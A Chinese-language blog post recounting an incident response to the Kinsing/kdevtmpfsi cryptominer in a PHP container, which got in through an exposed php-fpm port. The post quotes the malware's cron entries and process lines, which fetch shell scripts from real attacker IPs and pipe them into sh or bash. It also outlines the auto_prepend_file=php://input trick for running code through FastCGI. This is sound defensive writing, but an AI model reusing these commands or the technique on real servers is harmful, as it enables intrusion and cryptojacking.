---
title: "解决 kinsing 挖矿恶意程序的攻击"
date: 2021-08-27T19:41:07+08:00
publishdate: 2021-08-27T19:41:07+08:00
lastmod: 2021-08-27T19:41:07+08:00
draft: false
tags: ["kinsing", "kdevtmpfsi", "挖矿", "恶意程序", "漏洞", "php"]
---

# 环境

- 基于 php7.4.12 的容器
- 使用 Lumen 框架

# 发现异常状况

最开始察觉到异常是在错误邮件中

错误信息是 `Cannot modify header information - headers already sent by (output started at php://input:1)`

几天后，发现页面中出现大量跨域错误

查看 git 提交日志，发现最近并没有大的变动，怀疑是运维问题

再次检查邮箱，发现最近几日有大量 `Cannot modify header information - headers already sent by (output started at php://input:1)` 错误，错误文件指向了跨域处理文件，错误函数为 `header()`。与错误信息吻合，应该是在这之前有输出，此时可以确认导致错误的根本原因并非跨域问题。

通过测试 API，发现其中一些 POST API 在正确的响应内容前会先将 POST 请求中的请求体输出。而 GET 参数则一切正常。

# 寻找问题根源

多次测试 API 后发现一些规律。

1. 使用 x-www-form-urlencoded 和 json 方式时，PHP 直接返回了 POST 请求 body 信息。而使用 multipart/form-data 方式时却没有返回
2. GET 方法中，如果有 x-www-form-urlencoded 和 json body 时，会出现一样的错误
3. 不通过 Lumen 框架，直接请求 php 文件，如果请求中有 x-www-form-urlencoded 和 json body 信息时，同样会出现错误

这里基本可以确认和框架没有关系。而且引出了 `php://input` 数据流。

POST 方法中的 x-www-form-urlencoded 和 raw 格式 Body 体会写入到 `php://input` 流中，与之前发现的规律相吻合。

# 发现挖矿恶意程序

在查找 php:input 数据流问题时，偶然发现容器中运行着两个异常进程，名称分别是 `kinsing` 和 `kdevtmpfsi`

```
root@b3f806f09ccd:~# ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
root     10085  0.0  0.0   7632  1344 ?        R+   19:54   0:00 ps -aux
www-data 15438  0.0  0.1 718988 16148 ?        Sl   Aug04   0:40 /tmp/kinsing
www-data 15605  199 29.3 2930476 2397156 ?     Ssl  Aug04 11245:50 /tmp/kdevtmpfsi
```

这两个进程从 8 月 4 日晚启动，与第一次错误日志出现的时间有关联。

搜索后得知，这两个程序是挖矿恶意程序。使用 `kill -9` 强制杀掉后，再次测试 API，能够正常返回数据。

至此可以确认一切的根源就是该挖矿恶意程序导致的。

# 无法完全禁止挖矿恶意程序启动

使用 `kill -9` 命令强制杀死挖矿进程后，发现其会在几分钟内自行重启

查看 supervisor 服务，发现没有类似的配置。再查看 `cron` 服务，发现了异常计划任务。 `* * * * * curl http://195.3.146.118/unk.sh | sh > /dev/null 2>&1`

删除该计划任务，几分钟后又出现了类似的计划任务。 `* * * * * curl http://195.3.146.118/ph.sh | bash > /dev/null 2>&1`

再一次删除计划任务，修改了恶意程序名称后，发现恶意程序被重新下载执行

下载过程中的进程列表如下：

```
root@b3f806f09ccd# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
root        11  0.0  0.0   5504   880 ?        Ss   Jan29   1:18 /usr/sbin/cron
root     10749  0.0  0.1  80588 14492 ?        S    20:17   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
www-data 10750  0.0  0.1  86932 15836 ?        S    20:17   0:00 php-fpm: pool www
www-data 10751  0.0  0.2  88984 17796 ?        S    20:17   0:00 php-fpm: pool www
www-data 11671  0.0  0.0   2380   652 ?        S    20:57   0:00 sh -c [ -f "/bin/bash" ] && (curl -s http://194.38.20.199/ph.sh||wget -q -
www-data 11673  0.0  0.0   3992  1880 ?        S    20:57   0:00 bash
www-data 11765  0.1  0.0  23096  4832 ?        S    20:57   0:00 curl -o /tmp/kinsing http://194.38.20.199/kinsing
root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
```

通过进程列表可以得到 `curl` 命令执行的完整进程树

```
- [0]
  - [10749] php-fpm: master
    - [10750] php-fpm: pool
      - [11671] sh
        - [11673] bash
          - [11765] curl
```

通过进程树发现恶意程序是通过 `php-fpm` 进程执行了 `curl` 命令

# 临时恢复服务

搜索后发现网络上大部分是通过 redis 被注入的恶意代码。

我们的容器没有装 redis，很可能是通过 php-fpm 被注入的，类似于 [关于 linux 病毒 kinsing-kdevtmpfsi 的处理](https://learnku.com/articles/52350) 这篇文章所描述的

所以最终决定借着此次事件，升级到更安全的 PHP 版本，并重新制作镜像。

由于重新制作镜像需要一点时间，所以需要临时恢复服务。

最先尝试了以下方法，试图使用同名的程序替代真正的挖矿程序

1. 通过 `kill -9 [PID]` 删除恶意进程 `kinsing` 和 `kdevtmpfsi`
2. `find / -iname kinsing* -exec rm -fv {} \;` 删除恶意文件
3. `find / -iname kdevtmpfsi* -exec rm -fv {} \;`
4. `crontab -u www-data -e` 打开 cron 配置文件并手动删除恶意计划任务
5. `touch /tmp/kdevtmpfsi && touch /tmp/kinsing` 创建空的同名文件，防止恶意再次创建程序
6. `echo "kdevtmpfsi is fine now" > /tmp/kdevtmpfsi`
7. `echo "kinsing is fine now" > /tmp/kinsing`
8. `chmod 0444 /tmp/kdevtmpfsi` 设置为只读权限
9. `chmod 0444 /tmp/kinsing`

这种方法在 [kdevtmpfsi-using-the-entire-cpu](https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu) 这个页面中被提到，可能针对之前的版本是有效的。但现在已经无法骗过挖矿程序。该恶意程序会修改程序名称然后重新下载并启动。

```
root     11413  0.0  0.0   3992  2104 ?        Ss   Aug08   0:00 /bin/bash
www-data 17650  0.0  0.3 718732 29360 ?        Sl   02:30   0:00 /tmp/kinsing_aw7Y9KYM
www-data 17817  200 29.3 2737844 2398144 ?     Ssl  02:31  90:35 /tmp/kdevtmpfsi593659172
root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
```

不得已使用了另一种更直接的方式，每 20s 强制停止恶意程序。具体方法可以参考这篇文章 [Kinsing malware (kdevtmpfsi)- how to kill](https://www.createit.com/blog/kinsing-malware-how-to-kill/)

# php-fpm 的漏洞逻辑

- php-fpm 用于解析 fastcgi 协议，决定了 php 将执行哪个文件
- 当 php-fpm 端口暴露在外，就可以自己构建 fastcig 协议内容
- 而且通过 php-fpm 中的 `PHP_VALUE` 和 `PHP_ADMIN_VALUE` 环境变量，可以修改 PHP 的配置项
- 而在 PHP 配置项中，有这样两个配置项
  - `auto_prepend_file` 告诉 PHP 在目标文件执行前，先包含该配置项中指定的文件
  - `auto_append_file` 告诉 PHP 在目标文件执行后，包含该配置项中指定的文件
- `php://input` 包含 HTTP 中请求的 body 数据流信息（不包括 multipart/form-data 数据）
- 如果将 `auto_prepend_file` 设置为 `php://input`，那么在执行任何 php 文件前都会包含 `php://input` 中的 HTTP body 内容
- 而后将待执行的代码放在 body 中，就能够被执行

> fpm 一般会启动多个进程，你如果用了 ADMIN_VALUE，你访问的这个进程的配置项就改变了，但不影响其他进程。如果你多访问几次，就可能把所有进程的配置项都改了，而且是永久改的。直到下次重启 fpm。

详细内容可以参考这篇文章 [Fastcgi 协议分析 && PHP-FPM 未授权访问漏洞 && Exp 编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

# 问题解决

此次被攻击是由于疏忽导致，对外网暴露了 php-fpm 使用的 9000 端口。

外网禁用 9000 端口并重新构建镜像部署服务后，问题得以解决。

# 了解 Kinsing 恶意程序

> Kinsing is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment.

- [Zoom into Kinsing](https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/)
- [Kinsing Malware Attacks Targeting Container Environments](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)
- [Kinsing: The Malware with Two Faces](https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces)

# 参考 & 扩展

- [关于 linux 病毒 kinsing-kdevtmpfsi 的处理](https://learnku.com/articles/52350)
- [kdevtmpfsi-using-the-entire-cpu](https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu)
- [Kinsing malware (kdevtmpfsi)- how to kill](https://www.createit.com/blog/kinsing-malware-how-to-kill/)
- [干掉服务器上的‘kdevtmpfsi’和‘kinsing‘挖矿病毒](https://itmeida.com/myblog/JSPACE/2020-lockdown-9/)
- [记一次被注入挖矿程序 kdevtmpfi 解决记录](https://developer.huawei.com/consumer/cn/forum/topic/0202490219246760154)
- [关于 linux 病毒 kinsing-kdevtmpfsi 的处理](https://learnku.com/articles/52350)
- [Kinsing malware (kdevtmpfsi)- how to kill](https://www.createit.com/blog/kinsing-malware-how-to-kill/)
- [Zoom into Kinsing](https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/)
- [Kinsing Malware Attacks Targeting Container Environments](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)
- [Kinsing: The Malware with Two Faces](https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces)
- [Fastcgi 协议分析 && PHP-FPM 未授权访问漏洞 && Exp 编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
